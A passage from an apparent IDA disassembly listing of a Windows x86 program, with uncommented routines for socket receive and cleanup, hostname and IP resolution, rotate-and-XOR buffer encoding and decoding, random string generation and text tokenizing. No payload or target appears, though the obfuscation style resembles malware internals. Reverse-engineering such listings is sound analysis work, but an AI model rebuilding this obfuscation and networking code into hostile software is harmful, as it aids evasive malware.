flags		= dword	ptr  0Ch

		push	[esp+flags]	; flags
		push	[esp+4+len]	; len
		push	[esp+8+buf]	; buf
		push	dword ptr [ecx]	; s
		call	ds:recv
		retn	0Ch
sub_40329C	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_4032B3	proc near		; CODE XREF: sub_402CC3+5Bp
		push	dword ptr [ecx]	; s
		call	ds:closesocket
		jmp	ds:WSACleanup
sub_4032B3	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_4032C1	proc near		; CODE XREF: sub_402CC3+38p
					; sub_402D28+30p ...
		push	1
		pop	eax
		retn
sub_4032C1	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_4032C5	proc near		; CODE XREF: sub_403222+25p

var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ecx
		push	ebx
		push	esi
		push	edi
		mov	edi, [ebp+arg_0]
		push	1
		xor	esi, esi
		pop	ebx
		mov	[ebp+var_8], ecx
		push	edi		; char *
		mov	[ebp+var_4], esi
		call	_strlen
		test	eax, eax
		pop	ecx
		jle	short loc_403312

loc_4032E6:				; CODE XREF: sub_4032C5+41j
		mov	al, [esi+edi]
		cmp	al, 2Eh
		jnz	short loc_4032F2
		inc	[ebp+var_4]
		jmp	short loc_4032FC
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4032F2:				; CODE XREF: sub_4032C5+26j
		cmp	al, 30h
		jl	short loc_4032FA
		cmp	al, 39h
		jle	short loc_4032FC

loc_4032FA:				; CODE XREF: sub_4032C5+2Fj
		xor	ebx, ebx

loc_4032FC:				; CODE XREF: sub_4032C5+2Bj
					; sub_4032C5+33j
		push	edi		; char *
		inc	esi
		call	_strlen
		cmp	esi, eax
		pop	ecx
		jl	short loc_4032E6
		test	ebx, ebx
		jz	short loc_403324
		cmp	[ebp+var_4], 3
		jz	short loc_403316

loc_403312:				; CODE XREF: sub_4032C5+1Fj
		xor	eax, eax
		jmp	short loc_403350
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_403316:				; CODE XREF: sub_4032C5+4Bj
		push	[ebp+arg_4]
		mov	ecx, [ebp+var_8]
		push	edi
		call	sub_403357
		jmp	short loc_40334D
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_403324:				; CODE XREF: sub_4032C5+45j
		push	edi		; name
		call	ds:gethostbyname
		mov	esi, eax
		call	ds:WSAGetLastError
		test	esi, esi
		jz	short loc_40334D
		xor	eax, eax

loc_403339:				; CODE XREF: sub_4032C5+86j
		mov	ecx, [esi+0Ch]
		mov	edx, [ebp+arg_4]
		mov	ecx, [ecx]
		mov	cl, [ecx+eax]
		mov	[eax+edx], cl
		inc	eax
		cmp	eax, 4
		jl	short loc_403339

loc_40334D:				; CODE XREF: sub_4032C5+5Dj
					; sub_4032C5+70j
		push	1
		pop	eax

loc_403350:				; CODE XREF: sub_4032C5+4Fj
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	8
sub_4032C5	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_403357	proc near		; CODE XREF: sub_4032C5+58p

var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ebx
		mov	ebx, [ebp+arg_0]
		push	esi
		xor	esi, esi
		push	edi
		mov	[ebp+var_4], esi

loc_403366:				; CODE XREF: sub_403357+4Aj
		lea	eax, [ebp+arg_0]
		lea	edi, [esi+ebx]
		push	eax
		push	offset aD	; "%d"
		push	edi
		call	_sscanf
		mov	edx, [ebp+arg_4]
		mov	eax, [ebp+var_4]
		mov	cl, byte ptr [ebp+arg_0]
		add	esp, 0Ch
		cmp	eax, 3
		mov	[eax+edx], cl
		jz	short loc_4033A3
		inc	esi
		cmp	byte ptr [edi],	2Eh
		jz	short loc_40339A

loc_403392:				; CODE XREF: sub_403357+41j
		mov	al, [esi+ebx]
		inc	esi
		cmp	al, 2Eh
		jnz	short loc_403392

loc_40339A:				; CODE XREF: sub_403357+39j
		inc	[ebp+var_4]
		cmp	[ebp+var_4], 4
		jl	short loc_403366

loc_4033A3:				; CODE XREF: sub_403357+33j
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	8
sub_403357	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_4033AA	proc near		; CODE XREF: sub_40444A+7Cp
					; sub_4060CD+212p

var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ebx
		push	esi
		push	edi
		push	[ebp+arg_4]	; char *
		call	_strlen
		mov	esi, [ebp+arg_0]
		mov	ebx, [ebp+arg_8]
		pop	ecx
		mov	[ebp+var_4], eax

loc_4033C3:				; CODE XREF: sub_4033AA+4Cj
		push	esi		; char *
		call	_strlen
		mov	edi, eax
		pop	ecx
		test	edi, edi
		jz	short loc_4033FD
		test	ebx, ebx
		jz	short loc_4033DD
		mov	eax, esi
		sub	eax, [ebp+arg_0]
		cmp	eax, ebx
		jge	short loc_4033FD

loc_4033DD:				; CODE XREF: sub_4033AA+28j
		cmp	[ebp+arg_C], 0
		jz	short loc_4033F2
		push	[ebp+arg_4]
		push	esi
		call	unknown_libname_9 ; Microsoft VisualC 2-7/net runtime
		pop	ecx
		test	eax, eax
		pop	ecx
		jz	short loc_4033F8

loc_4033F2:				; CODE XREF: sub_4033AA+37j
		lea	esi, [esi+edi+1]
		jmp	short loc_4033C3
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4033F8:				; CODE XREF: sub_4033AA+46j
		or	eax, 0FFFFFFFFh
		jmp	short loc_40342F
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4033FD:				; CODE XREF: sub_4033AA+24j
					; sub_4033AA+31j
		mov	ecx, [ebp+var_4]
		mov	eax, esi
		sub	eax, [ebp+arg_0]
		lea	eax, [eax+ecx+2]
		cmp	eax, ebx
		jle	short loc_403415
		test	ebx, ebx
		jz	short loc_403415
		xor	eax, eax
		jmp	short loc_40342F
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_403415:				; CODE XREF: sub_4033AA+61j
					; sub_4033AA+65j
		push	[ebp+arg_4]	; char *
		push	esi		; char *
		call	_strcpy
		push	esi		; char *
		call	_strlen
		add	esp, 0Ch
		and	byte ptr [eax+esi+1], 0
		push	1
		pop	eax

loc_40342F:				; CODE XREF: sub_4033AA+51j
					; sub_4033AA+69j
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_4033AA	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_403434	proc near		; CODE XREF: sub_401198+18p
					; sub_401198+79p ...

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	esi
		mov	esi, [esp+arg_0]
		push	edi
		xor	edi, edi
		cmp	[esp+4+arg_4], edi
		jle	short loc_40345F

loc_403442:				; CODE XREF: sub_403434+29j
		push	esi		; char *
		call	_strlen
		test	eax, eax
		pop	ecx
		jz	short loc_40345F
		push	esi		; char *
		call	_strlen
		inc	edi
		pop	ecx
		cmp	edi, [esp+4+arg_4]
		lea	esi, [esi+eax+1]
		jl	short loc_403442

loc_40345F:				; CODE XREF: sub_403434+Cj
					; sub_403434+17j
		mov	eax, esi
		pop	edi
		pop	esi
		retn
sub_403434	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_403464	proc near		; CODE XREF: sub_401198+3Dp
					; sub_401284+3Ep ...

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	esi
		mov	esi, [esp+arg_0]
		push	edi
		xor	edi, edi

loc_40346C:				; CODE XREF: sub_403464+2Bj
		push	esi		; char *
		call	_strlen
		test	eax, eax
		pop	ecx
		jz	short loc_403491
		cmp	[esp+4+arg_4], 0
		jz	short loc_40348A
		mov	ecx, esi
		sub	ecx, [esp+4+arg_0]
		cmp	ecx, [esp+4+arg_4]
		jge	short loc_403491

loc_40348A:				; CODE XREF: sub_403464+18j
		lea	esi, [esi+eax+1]
		inc	edi
		jmp	short loc_40346C
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_403491:				; CODE XREF: sub_403464+11j
					; sub_403464+24j
		mov	eax, edi
		pop	edi
		pop	esi
		retn
sub_403464	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_403496	proc near		; CODE XREF: sub_4054EF+97p

arg_0		= dword	ptr  0Ch

		push	esi
		push	edi
		xor	edi, edi

loc_40349A:				; CODE XREF: sub_403496+32j
		mov	esi, edi
		push	0
		neg	esi
		sbb	esi, esi
		and	esi, 0F8h
		add	esi, 8
		call	sub_4046AB
		xor	edx, edx
		pop	ecx
		div	esi
		mov	eax, [esp+arg_0]
		add	eax, edi
		test	dl, dl
		mov	[eax], dl
		jnz	short loc_4034C4
		mov	byte ptr [eax],	1

loc_4034C4:				; CODE XREF: sub_403496+29j
		inc	edi
		cmp	edi, 4
		jl	short loc_40349A
		pop	edi
		pop	esi
		retn
sub_403496	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_4034CD	proc near		; CODE XREF: sub_4054EF+9Fp

var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_2		= byte ptr -2
var_1		= byte ptr -1
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		mov	eax, [ebp+arg_8]
		and	[ebp+var_8], 0
		cmp	[ebp+arg_4], 0
		push	ebx
		mov	cl, [eax]
		mov	al, [eax+1]
		push	esi
		push	edi
		mov	[ebp+var_2], cl
		mov	[ebp+var_1], al
		jle	short loc_403521

loc_4034EE:				; CODE XREF: sub_4034CD+52j
		mov	eax, [ebp+arg_0]
		mov	ecx, [ebp+var_8]
		add	eax, ecx
		mov	[ebp+var_C], eax
		mov	al, [eax]
		mov	byte ptr [ebp+arg_8+3],	al
		pusha
		mov	al, byte ptr [ebp+arg_8+3]
		mov	cl, [ebp+var_2]
		rol	al, cl
		xor	al, [ebp+var_1]
		mov	byte ptr [ebp+arg_8+3],	al
		popa
		mov	ecx, [ebp+var_C]
		mov	al, byte ptr [ebp+arg_8+3]
		inc	[ebp+var_8]
		mov	[ecx], al
		mov	eax, [ebp+var_8]
		cmp	eax, [ebp+arg_4]
		jl	short loc_4034EE

loc_403521:				; CODE XREF: sub_4034CD+1Fj
		push	1
		pop	eax
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_4034CD	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_403529	proc near		; CODE XREF: sub_4053E8+6Ap
					; sub_4054EF+83p

var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_2		= byte ptr -2
var_1		= byte ptr -1
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		mov	eax, [ebp+arg_8]
		and	[ebp+var_8], 0
		cmp	[ebp+arg_4], 0
		push	ebx
		mov	cl, [eax]
		mov	al, [eax+1]
		push	esi
		push	edi
		mov	[ebp+var_2], cl
		mov	[ebp+var_1], al
		jle	short loc_40357D

loc_40354A:				; CODE XREF: sub_403529+52j
		mov	eax, [ebp+arg_0]
		mov	ecx, [ebp+var_8]
		add	eax, ecx
		mov	[ebp+var_C], eax
		mov	al, [eax]
		mov	byte ptr [ebp+arg_8+3],	al
		pusha
		mov	al, byte ptr [ebp+arg_8+3]
		mov	cl, [ebp+var_2]
		xor	al, [ebp+var_1]
		ror	al, cl
		mov	byte ptr [ebp+arg_8+3],	al
		popa
		mov	ecx, [ebp+var_C]
		mov	al, byte ptr [ebp+arg_8+3]
		inc	[ebp+var_8]
		mov	[ecx], al
		mov	eax, [ebp+var_8]
		cmp	eax, [ebp+arg_4]
		jl	short loc_40354A

loc_40357D:				; CODE XREF: sub_403529+1Fj
		push	1
		pop	eax
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_403529	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_403585	proc near		; CODE XREF: sub_403624+31p
					; sub_403624+41p

arg_0		= dword	ptr  10h

		push	ebx
		push	esi
		push	edi
		xor	edi, edi
		push	edi
		call	sub_4046AB
		pop	ecx
		xor	edx, edx
		push	1Ah
		mov	ebx, [esp+4+arg_0]
		pop	ecx
		div	ecx
		mov	esi, edx
		add	esi, 61h
		cmp	ebx, 4
		jz	short loc_40361E
		cmp	ebx, 1
		jnz	short loc_4035C0
		push	edi
		call	sub_4046AB
		pop	ecx
		xor	edx, edx
		push	0Ah
		pop	ecx
		div	ecx
		mov	eax, edx
		add	eax, 30h
		jmp	short loc_403620
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4035C0:				; CODE XREF: sub_403585+24j
		test	bl, 2
		jz	short loc_4035D8
		push	edi
		call	sub_4046AB
		pop	ecx
		xor	edx, edx
		push	1Ah
		pop	ecx
		div	ecx
		mov	esi, edx
		add	esi, 41h

loc_4035D8:				; CODE XREF: sub_403585+3Ej
		push	edi
		call	sub_4046AB
		test	al, 1
		pop	ecx
		jz	short loc_4035FB
		test	bl, 4
		jz	short loc_4035FB
		push	edi
		call	sub_4046AB
		pop	ecx
		xor	edx, edx
		push	1Ah
		pop	ecx
		div	ecx
		mov	esi, edx
		add	esi, 61h

loc_4035FB:				; CODE XREF: sub_403585+5Cj
					; sub_403585+61j
		push	edi
		call	sub_4046AB
		test	al, 1
		pop	ecx
		jz	short loc_40361E
		test	bl, 1
		jz	short loc_40361E
		push	edi
		call	sub_4046AB
		pop	ecx
		xor	edx, edx
		push	0Ah
		pop	ecx
		div	ecx
		mov	esi, edx
		add	esi, 30h

loc_40361E:				; CODE XREF: sub_403585+1Fj
					; sub_403585+7Fj ...
		mov	eax, esi

loc_403620:				; CODE XREF: sub_403585+39j
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_403585	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_403624	proc near		; CODE XREF: sub_401841+25p
					; sub_4022DB+EDp ...

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h

		push	ebx
		mov	ebx, [esp+arg_4]
		push	esi
		push	edi
		mov	edi, [esp+8+arg_8]
		mov	esi, ebx
		cmp	edi, ebx
		jle	short loc_403647
		push	0
		call	sub_4046AB
		sub	edi, ebx
		xor	edx, edx
		div	edi
		pop	ecx
		mov	esi, edx
		add	esi, ebx

loc_403647:				; CODE XREF: sub_403624+Fj
		mov	ebx, [esp+8+arg_0]
		xor	edi, edi
		test	esi, esi
		jle	short loc_403663

loc_403651:				; CODE XREF: sub_403624+3Dj
		push	[esp+8+arg_C]
		call	sub_403585
		mov	[edi+ebx], al
		inc	edi
		cmp	edi, esi
		pop	ecx
		jl	short loc_403651

loc_403663:				; CODE XREF: sub_403624+2Bj
		push	2
		call	sub_403585
		pop	ecx
		mov	[ebx], al
		and	byte ptr [edi+ebx], 0
		push	1
		pop	eax
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_403624	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_403678	proc near		; CODE XREF: sub_403739+AFp
					; sub_403739+103p ...

arg_0		= byte ptr  0Ch

		push	esi
		push	edi
		mov	edi, offset asc_40E090 ; " \t\r\n"
		xor	esi, esi
		push	edi		; char *
		call	_strlen
		test	eax, eax
		pop	ecx
		jle	short loc_4036A4

loc_40368C:				; CODE XREF: sub_403678+2Aj
		mov	al, [esp+arg_0]
		cmp	al, byte ptr asc_40E090[esi] ; " \t\r\n"
		jz	short loc_4036A9
		push	edi		; char *
		inc	esi
		call	_strlen
		cmp	esi, eax
		pop	ecx
		jl	short loc_40368C

loc_4036A4:				; CODE XREF: sub_403678+12j
		xor	eax, eax

loc_4036A6:				; CODE XREF: sub_403678+34j
		pop	edi
		pop	esi
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4036A9:				; CODE XREF: sub_403678+1Ej
		push	1
		pop	eax
		jmp	short loc_4036A6
sub_403678	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_4036AE	proc near		; CODE XREF: sub_403739+30p
					; sub_403739+80p ...

arg_0		= byte ptr  8

		push	ebx
		mov	bl, [esp+arg_0]
		push	esi
		push	edi
		test	bl, bl
		jl	short loc_4036F8
		movsx	esi, bl
		push	esi		; int
		call	_isalpha
		test	eax, eax
		pop	ecx
		jnz	short loc_4036FC
		push	esi		; int
		call	_isdigit
		test	eax, eax
		pop	ecx
		jnz	short loc_4036FC
		mov	edi, offset a_@	; ".,()%$@!`~ "
		xor	esi, esi
		push	edi		; char *
		call	_strlen
		test	eax, eax
		pop	ecx
		jle	short loc_4036F8

loc_4036E4:				; CODE XREF: sub_4036AE+48j
		cmp	bl, byte ptr a_@[esi] ;	".,()%$@!`~ "
		jz	short loc_4036FC
		push	edi		; char *
		inc	esi
		call	_strlen
		cmp	esi, eax
		pop	ecx
		jl	short loc_4036E4

loc_4036F8:				; CODE XREF: sub_4036AE+9j
					; sub_4036AE+34j
		xor	eax, eax
		jmp	short loc_4036FF
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4036FC:				; CODE XREF: sub_4036AE+17j
					; sub_4036AE+22j ...
		push	1
		pop	eax

loc_4036FF:				; CODE XREF: sub_4036AE+4Cj
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_4036AE	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_403703	proc near		; CODE XREF: sub_403739+46p
					; sub_403739+17Ep ...

arg_0		= dword	ptr  8

		push	esi
		mov	esi, [esp+arg_0]
		mov	al, [esi]
		push	eax		; TestChar
		call	ds:IsDBCSLeadByte
		test	eax, eax
		jz	short loc_403720
		cmp	byte ptr [esi+1], 80h
		jbe	short loc_403720
		push	1
		pop	eax
		pop	esi
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_403720:				; CODE XREF: sub_403703+10j
					; sub_403703+16j
		xor	eax, eax
		pop	esi
		retn
sub_403703	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_403724	proc near		; CODE XREF: sub_403739+53p
					; sub_403739+60p ...

arg_0		= dword	ptr  4

		mov	eax, [esp+arg_0]
		mov	al, [eax]
		cmp	al, 0A1h
		jz	short loc_403735
		cmp	al, 0A3h
		jz	short loc_403735
		xor	eax, eax
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_403735:				; CODE XREF: sub_403724+8j
					; sub_403724+Cj
		push	1
		pop	eax
		retn
sub_403724	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_403739	proc near		; CODE XREF: sub_403944+5Fp
					; sub_403944+9Dp ...

var_7FC		= byte ptr -7FCh
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h
arg_10		= dword	ptr  18h
arg_14		= dword	ptr  1Ch
arg_18		= dword	ptr  20h

		push	ebp
		mov	ebp, esp
		sub	esp, 7FCh
		mov	eax, [ebp+arg_14]
		push	ebx
		push	esi
		push	edi
		mov	edi, [ebp+arg_4]
		xor	esi, esi
		mov	[ebp+var_4], esi
		and	byte ptr [edi],	0
		cmp	[ebp+arg_8], esi
		mov	[eax], esi
		jg	short loc_403763
		mov	eax, [ebp+arg_0]
		inc	eax
		jmp	loc_40393F
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_403763:				; CODE XREF: sub_403739+1Fj
		mov	ebx, [ebp+arg_0]
		mov	al, [ebx]
		push	eax
		call	sub_4036AE
		test	eax, eax
		pop	ecx
		jnz	short loc_4037C3
		mov	[ebp+arg_4], ebx

loc_403776:				; CODE XREF: sub_403739+88j
		cmp	[ebp+arg_18], 0
		jz	short loc_4037A7
		push	[ebp+arg_4]
		call	sub_403703
		test	eax, eax
		pop	ecx
		jz	short loc_403796
		push	[ebp+arg_4]
		call	sub_403724
		test	eax, eax
		pop	ecx
		jz	short loc_4037C3

loc_403796:				; CODE XREF: sub_403739+4Ej
		push	[ebp+arg_4]
		call	sub_403724
		test	eax, eax
		pop	ecx
		jz	short loc_4037A7
		inc	esi
		inc	[ebp+arg_4]

loc_4037A7:				; CODE XREF: sub_403739+41j
					; sub_403739+68j
		mov	eax, [ebp+arg_8]
		inc	esi
		inc	[ebp+arg_4]
		dec	eax
		cmp	esi, eax
		jge	short loc_4037C3
		mov	eax, [ebp+arg_4]
		mov	al, [eax]
		push	eax
		call	sub_4036AE
		test	eax, eax
		pop	ecx
		jz	short loc_403776

loc_4037C3:				; CODE XREF: sub_403739+38j
					; sub_403739+5Bj ...
		mov	eax, [ebp+arg_8]
		dec	eax
		cmp	esi, eax
		mov	[ebp+arg_4], eax
		jge	loc_40393C
		mov	al, [esi+ebx]
		push	eax
		call	sub_4036AE
		test	eax, eax
		pop	ecx
		jz	loc_4038A2

loc_4037E4:				; CODE XREF: sub_403739+BDj
		mov	al, [esi+ebx]
		push	eax
		call	sub_403678
		test	eax, eax
		pop	ecx
		jnz	short loc_4037FD
		inc	esi
		cmp	esi, [ebp+arg_4]
		jl	short loc_4037E4
		jmp	loc_40393F
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4037FD:				; CODE XREF: sub_403739+B7j
					; sub_403739+EBj
		mov	al, [esi+ebx]
		push	eax
		call	sub_4036AE
		test	eax, eax
		pop	ecx
		jz	short loc_403826
		mov	ecx, [ebp+var_4]
		mov	al, [esi+ebx]
		inc	[ebp+var_4]
		inc	esi
		cmp	esi, [ebp+arg_4]
		mov	[ecx+edi], al
		jge	short loc_403826
		mov	eax, [ebp+arg_10]
		dec	eax
		cmp	[ebp+var_4], eax
		jl	short loc_4037FD

loc_403826:				; CODE XREF: sub_403739+D0j
					; sub_403739+E2j
		mov	eax, [ebp+arg_10]
		dec	eax
		cmp	[ebp+var_4], eax
		jl	short loc_40384B
		cmp	[ebp+var_4], 0
		jz	short loc_40384B

loc_403835:				; CODE XREF: sub_403739+110j
		mov	eax, [ebp+var_4]
		mov	al, [eax+edi]
		push	eax
		call	sub_403678
		test	eax, eax
		pop	ecx
		jnz	short loc_40384B
		dec	[ebp+var_4]
		jnz	short loc_403835

loc_40384B:				; CODE XREF: sub_403739+F4j
					; sub_403739+FAj ...
		mov	eax, [ebp+var_4]
		test	eax, eax
		jl	short loc_403856
		and	byte ptr [eax+edi], 0

loc_403856:				; CODE XREF: sub_403739+117j
		xor	ebx, ebx
		cmp	[edi], bl
		jz	short loc_403871

